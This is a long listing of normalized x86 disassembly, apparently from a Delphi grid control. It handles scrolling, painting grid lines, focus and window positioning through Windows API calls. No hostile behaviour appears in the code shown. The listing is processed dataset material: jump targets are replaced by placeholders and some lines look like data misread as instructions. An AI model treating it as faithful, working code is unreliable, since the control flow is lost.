mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_40348c
test al al
jne r-xdata
push ebp
call sub_463d4c
pop ecx
jmp r-xdata
push ebp
call sub_463d80
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x71
jne r-xdata
jmp r-xdata
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
push ebp
call sub_463d4c
pop ecx
jmp r-xdata
push ebp
call sub_463dc8
pop ecx
test al al
je r-xdata
dec eax
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebp
call sub_463d80
pop ecx
mov edx [ ebp - 0x8 ]
mov cl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
call sub_460248
push ebp
call sub_463dc8
pop ecx
test al al
je r-xdata
dec eax
je r-xdata
push ebp
call sub_463dc8
pop ecx
test al al
je r-xdata
sub eax 0x9
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
call sub_4642a4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_40348c
test al al
jne r-xdata
push ebp
call sub_463de4
pop ecx
test al al
jne r-xdata
jmp r-xdata
push ebp
call sub_463de4
pop ecx
test al al
jne r-xdata
push ebp
call sub_463dc8
pop ecx
test al al
je r-xdata
jmp r-xdata
push ebp
call sub_463de4
pop ecx
test al al
jne r-xdata
test [ ebp - 0x9 ] 0x2
jne r-xdata
sub eax 0x12
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
push ebp
call sub_463d4c
pop ecx
jmp r-xdata
push ebp
call sub_463e54
pop ecx
test al al
je r-xdata
push ebp
call sub_463d4c
pop ecx
jmp r-xdata
push ebp
call sub_463eac
pop ecx
test al al
je r-xdata
push ebp
call sub_463de4
pop ecx
test al al
jne r-xdata
push ebp
call sub_463d4c
pop ecx
jmp r-xdata
push ebp
call sub_463e54
pop ecx
test al al
je r-xdata
push ebp
call sub_463d4c
pop ecx
jmp r-xdata
add eax 0xfffffffa
sub eax 0x2
jb r-xdata
push ebp
call sub_463d4c
pop ecx
jmp r-xdata
push ebp
call sub_463eac
pop ecx
test al al
je r-xdata
jmp r-xdata
sub_464125
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov edx ebx
mov eax [ edi + 0x240 ]
mov si 0xffba
call sub_40348c
mov al [ ebx ]
add al 0xe0
sub al 0xe0
jae r-xdata
xor eax eax
mov al [ ebx ]
cmp eax 0x16
jg r-xdata
mov dl [ ebx ]
mov eax [ edi + 0x240 ]
mov si 0xffb2
call sub_40348c
test al al
jne r-xdata
sub eax 0x18
je r-xdata
je r-xdata
mov [ ebx ] 0x0
push 0x0
call MessageBeep
mov eax [ edi + 0x240 ]
mov si 0xffb0
call sub_40348c
test al al
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x8
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov [ ebx ] 0x0
mov [ ebx ] 0x0
jmp r-xdata
add eax 0xfffffffb
sub eax 0xe0
jb r-xdata
dec eax
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
call sub_460378
jmp r-xdata
sub eax 0x4
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax edi
call sub_444968
push eax
call SendMessageA
cmp [ esp ] 0x0
jne r-xdata
jmp r-xdata
mov eax edi
call sub_434cd0
mov eax edi
call sub_4604cc
cmp eax [ esp + 0x4 ]
jne r-xdata
mov eax edi
call sub_4642a4
jmp r-xdata
mov [ ebx ] 0x0
jmp r-xdata
sub_46422c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ esi ]
sub eax 0x7
je r-xdata
mov eax ebx
call sub_4553f0
test eax eax
je r-xdata
sub eax 0x1fa
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
mov eax ebx
call sub_4553f0
mov edx [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
call GetMessageTime
mov edi eax
sub edi [ ebx + 0x244 ]
call GetDoubleClickTime
cmp edi eax
jae r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x244 ] eax
mov [ esi ] 0x203
mov edx esi
mov eax ebx
call sub_44237c
sub_4642c4
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
mov eax ebx
call sub_444968
push eax
call ValidateRect
push 0xffffffff
push 0x0
mov eax ebx
call sub_444968
push eax
call InvalidateRect
push esp
mov eax ebx
call sub_444968
push eax
call GetClientRect
push 0x2
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x240 ]
call sub_444968
push eax
mov eax ebx
call sub_444968
push eax
call MapWindowPoints
push esp
mov eax [ ebx + 0x240 ]
call sub_444968
push eax
call ValidateRect
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x240 ]
call sub_444968
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_464348
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_444c6c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_444968
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_4642c4
push 0x8c
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_444968
push eax
call SetWindowPos
mov eax ebx
mov si 0xffb5
call sub_40348c
test al al
je r-xdata
mov eax [ ebx + 0x240 ]
call sub_444968
push eax
call SetFocus
sub_4643b0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
push esi
call IsRectEmpty
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x94 ]
test bl bl
jne r-xdata
mov eax edi
call sub_464348
jmp r-xdata
mov al 0x1
mov eax edi
call sub_444968
push eax
call IsWindowVisible
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x240 ]
mov si 0xffb5
call sub_40348c
test al al
je r-xdata
mov eax edi
call sub_4642c4
xor eax eax
jmp r-xdata
mov eax edi
call sub_444968
push eax
call SetFocus
mov ebx eax
mov eax edi
call sub_4642c4
push 0x48
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
push eax
mov eax [ esi + 0x8 ]
mov ebp [ esi ]
sub eax ebp
push eax
mov eax [ esi + 0x4 ]
push eax
push ebp
push 0x0
mov eax edi
call sub_444968
push eax
call SetWindowPos
mov eax edi
mov edx [ eax ]
call [ edx + 0xfc ]
test bl bl
je r-xdata
sub_464460
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
sub ecx 0x2
mov edx 0x2
mov eax 0x2
call sub_412640
mov eax esp
push eax
push 0x0
push 0xb4
mov eax ebx
call sub_444968
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_444968
push eax
call SendMessageA
add esp 0x10
pop ebx
retn
sub_4644c8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_464574
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_4605b0
lea eax [ ebp - 0x4 ]
push eax
mov edi [ ebx + 0x240 ]
mov ecx [ edi + 0x22c ]
mov edx [ edi + 0x228 ]
mov eax edi
mov si 0xffac
call sub_40348c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4608a4
lea eax [ ebp - 0x8 ]
push eax
mov edi [ ebx + 0x240 ]
mov ecx [ edi + 0x22c ]
mov edx [ edi + 0x228 ]
mov eax edi
mov si 0xffaf
call sub_40348c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4605b0
mov eax [ ebx + 0x240 ]
mov si 0xffad
call sub_40348c
mov edx eax
mov eax ebx
call sub_460978
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46457b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
sub_464584
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_446630
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
mov [ ebx + 0x219 ] 0x1
mov [ ebx + 0x21c ] 0x5
mov [ ebx + 0x24c ] 0x5
mov [ ebx + 0x238 ] 0x1
mov [ ebx + 0x23c ] 0x1
mov [ ebx + 0x244 ] 0x1
mov ax [ r-xdata ]
mov [ ebx + 0x248 ] ax
mov ax [ r-xdata ]
mov [ ebx + 0x290 ] ax
mov [ ebx + 0x240 ] 0xff00000f
mov [ ebx + 0x254 ] 0x3
mov [ ebx + 0x218 ] 0x1
mov [ ebx + 0x230 ] 0x40
mov [ ebx + 0x234 ] 0x18
mov [ ebx + 0x28c ] 0x1
mov [ ebx + 0x28f ] 0x1
mov [ ebx + 0x28d ] 0x0
mov edx 0xff000005
mov eax ebx
call sub_43e2ec
xor edx edx
mov eax ebx
call sub_43e310
mov dl 0x1
mov eax ebx
call sub_444b9c
mov eax [ ebx + 0x21c ]
imul [ ebx + 0x230 ]
push eax
mov eax [ ebx + 0x24c ]
imul [ ebx + 0x234 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax ebx
call sub_466b04
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_4646d4
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x27c ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44668c
mov eax [ esi + 0x220 ]
call sub_4026dc
mov eax [ esi + 0x250 ]
call sub_4026dc
mov eax [ esi + 0x224 ]
call sub_4026dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_464728
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_464834
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0xc ]
add eax [ edx - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax - 0x4 ] 0x0
jge r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b10
mov eax [ ebp - 0x10 ]
call sub_463740
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
imul esi
mov [ ebp - 0x8 ] eax
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov edx [ ebp + 0xc ]
cmp eax [ edx - 0x8 ]
jl r-xdata
push esi
mov eax [ ebp + 0xc ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0xc ]
mov edx [ eax - 0x8 ]
mov eax ebx
call sub_463a4c
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0xc ]
sub eax [ ecx - 0x4 ]
dec eax
sub eax edx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46483b
lea eax [ ebp - 0x10 ]
call sub_403fe0
retn
mov eax [ ebp + 0xc ]
cmp [ eax - 0x4 ] 0x0
jge r-xdata
cmp [ ebx ] 0x0
je r-xdata
inc eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0xc ]
sub eax [ edx - 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov ecx [ ebx ]
mov ecx [ ecx + edx * 4 ]
add [ ebp - 0x8 ] ecx
inc edx
dec eax
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
sub_464848
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x228 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x22c ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x21c ]
mov [ ebp - 0x18 ] eax
mov edx [ ebx + 0x24c ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebx + 0x238 ]
mov [ ebp - 0x2c ] ecx
dec eax
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x23c ]
mov [ ebp - 0x28 ] eax
dec edx
mov [ ebp - 0x20 ] edx
xor edi edi
xor eax eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x4 ]
test esi esi
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
neg esi
push ebp
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebx + 0x220 ]
lea eax [ ebx + 0x21c ]
mov ecx [ ebx + 0x230 ]
call sub_464728
pop ecx
mov edi eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2c ] eax
add esi [ ebp - 0x8 ]
mov eax [ ebx + 0x258 ]
cmp esi eax
jg r-xdata
push ebp
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebx + 0x250 ]
lea eax [ ebx + 0x24c ]
mov ecx [ ebx + 0x234 ]
call sub_464728
pop ecx
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
add esi [ ebp - 0x8 ]
mov eax [ ebx + 0x25c ]
cmp esi eax
jg r-xdata
push 0x1
lea ecx [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
mov eax ebx
call sub_466a14
lea eax [ ebp - 0x3c ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
dec eax
mov [ ebp - 0x24 ] eax
dec eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax ebx
mov si 0xffa8
call sub_40348c
mov eax [ ebp - 0x10 ]
cmp eax [ ebx + 0x228 ]
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push edi
mov eax ebx
call sub_444968
push eax
call ScrollWindow
mov eax ebx
call sub_444968
push eax
call UpdateWindow
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx eax
mov eax ebx
call sub_467258
mov edx [ ebp - 0xc ]
cmp edx [ ebx + 0x22c ]
je r-xdata
sub_4649ac
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov esi eax
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_466a14
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_4649fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4649ac
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_464a30
push ebx
mov ebx eax
mov ax [ ebx + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
xor eax eax
pop ebx
retn
cmp [ ebx + 0x28d ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_444c6c
test al al
je r-xdata
test [ ebx + 0x249 ] 0x20
jne r-xdata
mov al 0x1
pop ebx
retn
mov eax ebx
call sub_464a8c
test al al
jne r-xdata
sub_464a8c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4553f0
test eax eax
je r-xdata
call GetFocus
mov edi eax
jmp r-xdata
cmp esi [ eax + 0x220 ]
jne r-xdata
push edi
call IsWindow
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
jmp r-xdata
test bl bl
je r-xdata
cmp edi [ esi + 0x180 ]
jne r-xdata
push edi
call GetParent
mov edi eax
mov bl 0x1
jmp r-xdata
sub_464b2c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax edi
call sub_464b1c
mov esi [ edi + 0x27c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0x102
mov eax esi
call sub_444968
push eax
call PostMessageA
sub_464b80
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_4178bc
mov ebx [ edi + 0x21c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_4178c4
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax ebp
call sub_41780c
mov ecx eax
mov edx esi
mov eax edi
call sub_468d80
inc esi
dec ebx
jne r-xdata
sub_464bc0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_4178bc
mov ebx [ edi + 0x24c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_4178c4
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax ebp
call sub_41780c
mov ecx eax
mov edx esi
mov eax edi
call sub_4690f0
inc esi
dec ebx
jne r-xdata
sub_464c00
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_419108
mov ebx [ edi + 0x21c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_419110
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_468c60
mov edx eax
mov eax ebp
call sub_419094
inc esi
dec ebx
jne r-xdata
sub_464c40
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_419108
mov ebx [ edi + 0x24c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_419110
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_468c80
mov edx eax
mov eax ebp
call sub_419094
inc esi
dec ebx
jne r-xdata
sub_464c80
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x220 ] 0x0
setne al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x220 ]
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x220 ]
call sub_463bb0
xor al 0x1
pop ebx
pop ebp
retn
sub_464cc4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x250 ] 0x0
setne al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x250 ]
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x250 ]
call sub_463bb0
xor al 0x1
pop ebx
pop ebp
retn
sub_464d08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_441ca8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x28f ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
push eax
push sub_464b80
mov eax [ ebp - 0x8 ]
push eax
push sub_464c00
push ebp
call sub_464c80
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x8 ]
push eax
push sub_464bc0
mov eax [ ebp - 0x8 ]
push eax
push sub_464c40
push ebp
call sub_464cc4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_464dac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x220 ] 0x0
je r-xdata
push edi
lea edx [ ebx + 0x228 ]
mov ecx esi
mov eax ebx
call sub_46719c
push edi
lea edx [ ebx + 0x210 ]
mov ecx esi
mov eax ebx
call sub_46719c
push edi
lea edx [ ebx + 0x280 ]
mov ecx esi
mov eax ebx
call sub_46719c
xor eax eax
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_468cf0
mov [ esp + 0xc ] eax
cmp edi esi
jle r-xdata
lea ecx [ edi + 0x1 ]
lea ebp [ esi + 0x1 ]
mov edx ebp
lea eax [ ebx + 0x220 ]
call sub_463b58
lea ecx [ edi + 0x1 ]
mov edx ebp
lea eax [ ebx + 0x224 ]
call sub_463b58
mov [ esp ] edi
mov [ esp + 0x8 ] esi
mov [ esp ] esi
mov [ esp + 0x8 ] edi
jmp r-xdata
mov eax ebx
call sub_46928c
mov eax ebx
mov si 0xffa5
call sub_40348c
mov edx esp
mov eax ebx
call sub_466b90
mov ecx edi
mov edx esi
mov eax ebx
mov si 0xffaa
call sub_40348c
cmp [ ebx + 0x220 ] 0x0
je r-xdata
sub_464e84
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
lea edx [ ebx + 0x22c ]
mov ecx esi
mov eax ebx
call sub_46719c
push edi
lea edx [ ebx + 0x214 ]
mov ecx esi
mov eax ebx
call sub_46719c
push edi
lea edx [ ebx + 0x284 ]
mov ecx esi
mov eax ebx
call sub_46719c
mov ecx edi
mov edx esi
mov eax ebx
mov si 0xffa9
call sub_40348c
cmp [ ebx + 0x250 ] 0x0
je r-xdata
lea ecx [ edi + 0x1 ]
lea edx [ esi + 0x1 ]
lea eax [ ebx + 0x250 ]
call sub_463b58
mov eax ebx
call sub_46928c
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffa4
call sub_40348c
sub_464f14
push ebx
push esi
push edi
add esp 0xffffff90
mov edi ecx
mov esi edx
mov ebx eax
mov al [ ebx + 0x28e ]
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
cmp [ esp ] 0x0
setne al
add esp 0x70
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_465bec
push esp
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xcc ]
sub_464f6c
push ebx
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x28d ] 0x0
je r-xdata
add esp 0x10
pop ebx
retn
cmp [ ebx + 0x27c ] 0x0
je r-xdata
push esp
mov ecx [ ebx + 0x22c ]
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_4649fc
mov edx esp
mov eax [ ebx + 0x27c ]
call sub_4644b8
sub_464fb8
pop ecx
mov edx esp
add eax 0x3
and eax 0xfffffffc
cmp eax 0xffc
jle r-xdata
sub esp eax
mov eax esp
push edx
mov edx esp
sub edx 0x4
push edx
push ecx
retn
sub esp 0xffc
push eax
sub eax 0x1000
jns r-xdata
add eax 0x1000
sub_465000
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x208 ]
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x244 ]
mov eax [ esi + 0x10 ]
call sub_41cd40
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ esi + 0x10 ]
call sub_41cc14
mov eax [ ebp + 0xc ]
mov edx [ eax + 0xc ]
mov eax [ esi + 0x10 ]
call sub_41cc14
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x10 ] eax
mov edx edi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov edx [ edx + ecx * 4 ]
mov ecx [ ebx ]
shr ecx 0x1
add edx ecx
add eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x2c ] eax
mov eax [ esi + 0x10 ]
call sub_41cc0c
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov eax [ esi + 0x10 ]
call sub_41cd38
push eax
push 0x12200
call ExtCreatePen
mov edx eax
mov eax [ esi + 0x10 ]
call sub_41ccd4
mov eax [ esi + 0x10 ]
call sub_41cd38
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
xor eax 0x1
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov edx [ edx + eax * 4 ]
mov [ ebp - 0x18 ] edx
add eax 0x2
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov eax [ edx + eax * 4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x2
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov eax [ edx + eax * 4 ]
add eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0xc ]
shl eax 0x2
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x14 ]
jg r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
shr eax 0x2
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x10 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d780
push eax
call PolyPolyline
cmp edi [ ebx + 0x10 ]
jg r-xdata
inc edi
mov edx edi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
test eax eax
jg r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x20 ]
jle r-xdata
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x4 ]
xor eax 0x1
mov edx eax
add edx [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x18 ]
mov [ ecx + edx * 4 ] esi
add [ ebp - 0xc ] 0x2
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x8 ]
mov [ ecx + edx * 4 ] esi
add eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
mov [ edx + eax * 4 ] ecx
add [ ebp - 0xc ] 0x2
sub_4651e8
push ebp
